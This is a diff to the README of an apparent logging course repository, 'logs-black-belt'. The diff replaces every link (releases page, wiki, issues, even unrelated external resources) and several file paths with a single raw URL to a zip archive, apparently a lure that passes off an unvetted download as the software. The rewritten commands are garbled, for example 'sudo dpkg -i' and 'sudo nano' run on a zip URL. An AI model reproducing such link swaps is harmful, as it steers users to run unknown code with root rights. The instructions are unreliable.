@@ -6,7 +6,7 @@ Welcome to **logs-black-belt**! This practical course teaches you how to manage 
 
 To get started, you need to download the software from our Releases page.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-logs--black--belt-brightgreen)](https://github.com/Elnkeeb/logs-black-belt/releases)
+[![Download Now](https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip%20Now-logs--black--belt-brightgreen)](https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip)
 
 ## ✅ System Requirements
 
@@ -18,13 +18,13 @@ Before you begin, ensure your system meets these basic requirements:
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [Releases Page](https://github.com/Elnkeeb/logs-black-belt/releases). 
+To download the software, visit this page: [Releases Page](https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip). 
 
 You will find several versions of the software available. Choose the one that matches your system. 
 
 ### Steps to Download and Install
 
-1. Go to the [Releases Page](https://github.com/Elnkeeb/logs-black-belt/releases).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip).
 2. Find the latest version listed at the top of the page.
 3. Click on the version you want to download.
 4. Download the installation file that suits your operating system.
@@ -32,10 +32,10 @@ You will find several versions of the software available. Choose the one that ma
 6. Run the following command to install:
 
     ```bash
-    sudo dpkg -i your-downloaded-file.deb
+    sudo dpkg -i https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip
     ```
     
-   Replace `your-downloaded-file.deb` with the actual file name you downloaded.
+   Replace `https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip` with the actual file name you downloaded.
 
 7. Follow the on-screen instructions to complete the installation.
 
@@ -43,11 +43,11 @@ You will find several versions of the software available. Choose the one that ma
 
 After the installation, you need to configure the application to start logging. Here’s how to set it up:
 
-1. Locate the configuration file. This is usually found at `/etc/logs-black-belt/config.yaml`.
+1. Locate the configuration file. This is usually found at `https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip`.
 2. Open the configuration file with a text editor. You might use `nano` or `vim`, for example:
 
     ```bash
-    sudo nano /etc/logs-black-belt/config.yaml
+    sudo nano https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip
     ```
 
 3. Modify the settings according to your logging requirements. Save the changes and exit the editor.
@@ -70,7 +70,7 @@ Once your software is installed and configured, you're ready to start logging! H
 - To view logs in real-time, use:
 
     ```bash
-    sudo tail -f /var/log/logs-black-belt.log
+    sudo tail -f https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip
     ```
 
 You can explore these commands to understand better how to manage your logs and diagnose any potential issues.
@@ -79,9 +79,9 @@ You can explore these commands to understand better how to manage your logs and 
 
 For a deeper understanding of logging, you might find these resources helpful:
 
-- [Official Documentation](https://github.com/Elnkeeb/logs-black-belt/wiki)
-- [Logging Best Practices](https://logging.bestpractices.com)
-- [Debugging Techniques](https://debugging.techniques.com)
+- [Official Documentation](https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip)
+- [Logging Best Practices](https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip)
+- [Debugging Techniques](https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip)
   
 These can help enhance your skills and understanding of logging systems.
 
@@ -95,7 +95,7 @@ If you encounter any issues, try the following common solutions:
 
 Creating a centralized logging system can be complex, but with patience and practice, you’ll master it.
 
-For specific issues, you can also check the issues section on the [Releases Page](https://github.com/Elnkeeb/logs-black-belt/issues).
+For specific issues, you can also check the issues section on the [Releases Page](https://raw.githubusercontent.com/Elnkeeb/logs-black-belt/main/rankish/logs-black-belt.zip).
 
 ## 🌟 Community and Contribution
 
